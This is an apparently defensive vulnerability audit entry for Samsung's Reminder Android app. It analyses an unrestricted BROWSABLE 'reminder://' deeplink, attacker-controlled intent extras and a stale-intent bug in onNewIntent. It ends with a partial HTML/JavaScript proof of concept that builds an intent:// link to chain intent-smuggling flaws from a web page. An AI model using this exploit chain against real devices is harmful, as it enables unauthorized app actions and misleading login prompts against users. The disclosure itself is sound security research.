## [V-015] MainListActivity â€” BROWSABLE `reminder://` Scheme Amplifies *All* Downstream Sinks Into Web-Reachable Attack Surface

**File:** `sources/resources/AndroidManifest.xml` (lines 500â€“505) + `sources/com/samsung/android/app/reminder/ui/list/main/MainListActivity.java`
**Severity:** Critical â€” turns multiple previously-local-only sinks (V-008, V-009, V-010, V-011, V-013, V-014) into **one-click web attacks**.
**Class of flaw:** CWE-939 (Improper Authorization in Handler for Custom URL Scheme) + CWE-601 (Open Redirect flavour).

### Summary
MainListActivity's deeplink filter is:
```xml
<intent-filter>
    <data android:scheme="reminder"/>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
</intent-filter>
```
There is **no `host=`** or `path=` restriction â€” any `reminder://anything` URI matches. Because `BROWSABLE` is set, any web page served to the user can craft an `intent://â€¦#Intent;scheme=reminder;â€¦;end` link that Chrome/Samsung-Internet resolve and start.

MainListActivity.`onCreate` reads the following attacker-controllable extras from `getIntent()` **without caller-package / signature verification**:

| Extra key | Path |
|-----------|-----|
| `popover_intent` | Gate for triggering `M.c(str)` â†’ V-008 parseUri bypass, and feeds `D.l(intent)` â†’ V-009 pending_data parseUri, V-010 Serializable, V-011 self-embed |
| `pending_request`, `pending_result`, `pending_data` | Directly reach V-009 via `D.l` (MainListActivity owns a `D` instance at field `f31382d2` and wires it through `V0() â†’ D.l(intent)` via `Y(intent)`) |
| `checkPresetIds` | V-010 Serializable deserialisation |
| `sync_reminder_data` | V-013 |
| `widgetExecuteScanReminder`, `widgetExecuteScanReminderTimestamp`, `spaceIdForScanReminder` | V-014 |
| `add_reminder_from_share` | Forces V-011 branch in `D.l` |
| `launch_with_ms_login`, `launch_with_ms_login_again` | Forces Microsoft OAuth re-login flow (privacy / UX abuse) |
| `spaceId`, `Space_Id`, `Category_Type`, `conditionType`, `group_id`, `space_id` | Arbitrary category / group / space switching on demand |
| `launch_reminder_from_task`, `launch_reminder_from_notification_group` | Spoofable state flags |
| `launchFromEdge` | Forces edge-panel analytics ping on behalf of user |

At onCreate line 1858: `this.f31382d2 = V0();` â€” MainListActivity instantiates its own `com.samsung.android.app.reminder.ui.detail.add.D` (the AddDelegate that hosts V-009/V-010/V-011). `V0()` creates a fresh `D(this, this.f31383e2, true)` on demand. Subsequently, any `Y(intent)` (line 673) invocation calls `V0().l(intent)` â€” fully replaying the attacker's Intent through `D.l`, meaning **V-008 / V-009 / V-010 / V-011 are all reachable directly from a web page via MainListActivity** â€” no `DetailActivity` chain required.

### `onNewIntent` stale-intent bug (sub-issue)
Lines 1975â€“1998:
```java
public final void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    ...
    this.f31363J1 = Boolean.valueOf(getIntent().getBooleanExtra("launch_reminder_from_task", false));  // OLD intent!
    this.f31361H1.c0(intent.getBooleanExtra("launch_reminder_from_notification_group", false));       // NEW intent
    this.f31364K1 = Boolean.valueOf(getIntent().getBooleanExtra("isFromWidget", false));              // OLD
    if (getIntent().hasExtra("Space_Id")) {                                                           // OLD
        this.f31361H1.Z(getIntent().getStringExtra("Space_Id"));
    } else if (getIntent().hasExtra("Category_Type")) {
        this.f31361H1.Y(getIntent().getIntExtra("Category_Type", 0));
    } else {
        this.f31361H1.S(null);
    }
    if (intent.getBooleanExtra("launch_with_ms_login_again", false)) { ... }                          // NEW
    ...
    k1(intent);                                                                                       // NEW
    U0(intent);                                                                                       // NEW
}
```
`setIntent(intent)` is **never** called, so `getIntent()` returns the **original** Intent the activity was first created with; interspersed reads of `intent` (new) and `getIntent()` (old) produce a confused-logic state. Concrete abuse:

* Attacker opens the app once with `Space_Id=A` (populates `getIntent()`).
* Later, the attacker sends a new intent with `Space_Id=B` + `launch_with_ms_login_again=true` via `onNewIntent`.
* `this.f31361H1.Z("A")` runs (old intent), but the MS re-login branch fires on the **new** intent. The user sees MS login while still in category A, enabling phishing-grade MS OAuth prompts in a misleading context.

### Proof-of-Concept (web link â†’ full exploit chain)

```html
<!-- Delivers a parseUri-smuggled ReminderAddView intent via popover_intent -->
<a id="k" href=''>Open Reminder</a>
<script>
  // Build the smuggled secondary intent (no setPackage â†’ V-008 bypass)
  const stage2 = "intent:#Intent;action=com.samsung.android.app.reminder.action.ReminderAddView;" +
                 "component=com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.add.AddActivity;" +
                 "S.uuid=deadbeef-0000-0000-0000-000000000000;i.add_view_type=2;end";
  const encoded = encodeURIComponent(stage2);
  document.getElementById('k').href =
    'intent://mainlist#Intent;scheme=reminder;' +
    'S.popover_intent=' + encoded + ';' +
    'B.add_reminder_from_share=true;' +       // forces V-011 branch in D.l
    'i.pending_request=100;i.pending_result=-1;' +  // triggers V-009 (pending_data if added)
    'end';
